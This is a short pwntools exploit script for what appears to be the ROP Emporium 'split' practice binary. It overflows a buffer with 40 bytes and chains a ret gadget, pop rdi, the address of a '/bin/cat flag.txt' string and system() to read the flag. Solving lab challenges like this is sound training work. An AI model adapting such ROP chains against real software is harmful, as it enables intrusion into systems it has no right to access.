from pwn import *
from socket import *
from struct import *

elf = ELF('./split')
p = elf.process()

context.arch = 'amd64'
context.log_level = 'debug'

#payload = junk + ret + pop rdi + "/bin/cat flag.txt" + system()
payload =b'A'*40 + p64(0x000000000040053e) + p64(0x00000000004007c3) + p64(0x00601060) + p64(0x400560)

p.recvuntil('>')

p.sendline(payload)

print(p.recvall())
